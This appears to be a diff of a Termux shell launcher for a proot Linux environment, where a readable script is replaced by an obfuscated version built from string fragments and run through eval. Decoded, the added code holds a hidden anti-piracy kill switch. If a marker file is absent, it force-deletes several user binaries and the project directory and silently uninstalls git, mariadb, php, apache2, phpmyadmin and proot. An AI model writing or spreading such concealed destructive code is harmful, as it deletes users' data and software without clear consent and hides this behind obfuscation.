@@ -1,31 +1,3 @@
-#!/data/data/com.termux/files/usr/bin/bash
-#KhanhNguyen9872
-if [ -f ~/../usr/bin/termux-backup ] 2> /dev/null; then
-  rm -f ~/../usr/bin/termux-backup 2> /dev/null
-fi
-cd ~/../usr/share/KhanhNguyen9872 2> /dev/null
-unset LD_PRELOAD
-command="proot"
-command+=" --link2symlink"
-command+=" -0"
-command+=" -r KhanhNguyen9872"
-command+=" -b /proc"
-command+=" -w /root"
-command+=" /usr/bin/env -i"
-command+=" HOME=/root"
-command+=" PATH=/usr/local/sbin:/usr/local/bin:/bin:/usr/bin:/sbin:/usr/sbin:/usr/games:/usr/local/games"
-command+=" TERM=$TERM"
-command+=" LANG=C.UTF-8"
-command+=" /bin/bash --login"
-if [ -f ~/../usr/etc/HOIUC ] 2> /dev/null; then
-  $command -c "khanh"
-else
-  if [ -f ~/../usr/etc/FullNV ] 2> /dev/null; then
-      $command -c "khanh1"
-  else
-      echo ""
-      echo " Sai Source! Vui long cai dat lai!!!"
-      echo ""
-      exit 0
-  fi
-fi
+z="
+";wz='inja';eBz=' pro';BBz='l';JDz='echo';gz='Du l';cCz='ames';az=' cai';GDz='ll; ';eCz='=" T';kCz='C.UT';RDz='cai ';HDz='then';iz='se b';fz='n\n ';ez='ep!\';cBz='pmya';gCz='$TER';gBz='y 2>';Bz=' ! -';SBz='ve g';HCz='=" /';PBz='ll';LCz='=" H';Jz='9872';Wz='${re';BDz='nh"';DBz='amp ';WCz=':/sb';FCz='w /r';rBz='"pro';YBz='pach';MBz='2 2>';Pz='> /d';UBz='aria';ECz='roc"';mCz='bash';xz=' 2> ';wCz='$com';EBz='rf ~';Zz='n da';PCz='=" P';Dz='../u';rCz='/etc';yBz='k"';ODz='e! V';KBz='guye';ACz='0"';ICz='bin/';oz='rm -';qz='in/m';CCz='2"';QCz='ATH=';GBz='usr/';EDz='lNV ';Az='if [';Lz='/bin';hBz='exit';iCz='=" L';xCz='mand';NDz='ourc';vBz='-lin';yz='/dev';dz='i ph';VBz='db p';uz='null';qCz='~/..';yCz=' -c ';jCz='ANG=';aBz='ache';XCz='sbin';sz='2> /';OCz='t"';BCz='r Kh';uCz='l; t';tz='dev/';FBz='/../';nCz=' --l';ABz='/nul';Qz='ev/n';IBz='e/Kh';Tz='n';kz='a!\n';xBz='mlin';SDz='dat ';oCz='ogin';Gz='/Kha';jz='i xo';qBz='and=';XBz='hp-a';QBz='apt ';fCz='ERM=';Iz='uyen';TDz='lai!';GCz='oot"';aCz='mes:';nz='t}"';dBz='dmin';iBz=' 0';nBz='_PRE';QDz='ong ';vz='in/n';Kz='/usr';hz='ieu ';mBz='t LD';uBz='=" -';rz='enu ';SCz='al/s';KCz='-i"';ADz='"kha';vCz='hen';KDz=' ""';tCz='UC ]';JCz='env ';YCz=':/us';hCz='M"';ZCz='r/ga';Rz='ull;';Oz=' ] 2';Hz='nhNg';NCz='/roo';oBz='LOAD';bz=' dat';Nz='nhng';CBz='in/t';UCz='al/b';lCz='F-8"';TBz='it m';Mz='/kha';TCz='bin:';wBz='k2sy';RCz='/loc';sBz='ot"';lz='\n${';FDz='] 2>';Uz='prin';RBz='remo';sCz='/HOI';pz='sr/b';PDz='ui l';ZBz='e ap';HBz='shar';bCz='al/g';Xz='d}\n';UDz='!!"';JBz='anhN';jBz='fi';DCz='b /p';pBz='comm';NBz=' /de';MCz='OME=';pCz=' -f ';Ez='sr/s';Vz='tf "';lBz='unse';WBz='hp p';LDz=' " S';DDz='/Ful';bBz='2 ph';OBz='v/nu';LBz='n987';MDz='ai S';mz='rese';kBz='cd ~';CDz='else';tBz='and+';Cz='f ~/';VCz='in:/';IDz='nh1"';Yz='\nBa';fBz='ot -';Sz=' the';dCz='"';cz=' tra';Fz='hare';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Iz$Jz$Oz$Pz$Qz$Rz$Sz$Tz$z$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$z$oz$Cz$Dz$pz$qz$rz$sz$tz$uz$z$oz$Cz$Dz$pz$vz$wz$xz$yz$ABz$BBz$z$oz$Cz$Dz$pz$CBz$DBz$sz$tz$uz$z$oz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$z$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$NBz$OBz$PBz$z$hBz$iBz$z$jBz$z$kBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$z$lBz$mBz$nBz$oBz$z$pBz$qBz$rBz$sBz$z$pBz$tBz$uBz$vBz$wBz$xBz$yBz$z$pBz$tBz$uBz$ACz$z$pBz$tBz$uBz$BCz$JBz$KBz$LBz$CCz$z$pBz$tBz$uBz$DCz$ECz$z$pBz$tBz$uBz$FCz$GCz$z$pBz$tBz$HCz$GBz$ICz$JCz$KCz$z$pBz$tBz$LCz$MCz$NCz$OCz$z$pBz$tBz$PCz$QCz$Kz$RCz$SCz$TCz$Kz$RCz$UCz$VCz$TCz$Kz$Lz$WCz$VCz$GBz$XCz$YCz$ZCz$aCz$Kz$RCz$bCz$cCz$dCz$z$pBz$tBz$eCz$fCz$gCz$hCz$z$pBz$tBz$iCz$jCz$kCz$lCz$z$pBz$tBz$HCz$ICz$mCz$nCz$oCz$dCz$z$Az$pCz$qCz$Kz$rCz$sCz$tCz$xz$yz$ABz$uCz$vCz$z$wCz$xCz$yCz$ADz$BDz$z$CDz$z$Az$pCz$qCz$Kz$rCz$DDz$EDz$FDz$NBz$OBz$GDz$HDz$z$wCz$xCz$yCz$ADz$IDz$z$CDz$z$JDz$KDz$z$JDz$LDz$MDz$NDz$ODz$PDz$QDz$RDz$SDz$TDz$UDz$z$JDz$KDz$z$hBz$iBz$z$jBz$z$jBz"
